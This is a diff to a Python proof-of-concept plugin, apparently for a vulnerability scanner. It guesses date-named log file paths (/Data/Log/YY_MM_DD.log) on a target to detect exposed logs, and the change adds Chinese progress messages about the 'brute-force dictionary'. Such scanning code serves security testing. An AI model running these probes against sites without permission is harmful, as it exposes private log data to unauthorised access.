@@ -53,10 +53,12 @@ class Poc(ABPoc):
             while datestart<dateend:
                 datestart+=datetime.timedelta(days=1)
                 payload =  datestart.strftime('%Y_%m_%d')[2:10]
-
+                
+                self.output.info('正在生成日志爆破字典')
                 vul_url = arg + '/Data/Log/'+payload+'.log'
                 response = requests.get(vul_url)
                 if response.status_code == 200 and 'INFO:' in response.text:
+                    self.output.info('字典爆破成功')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
                     break
 
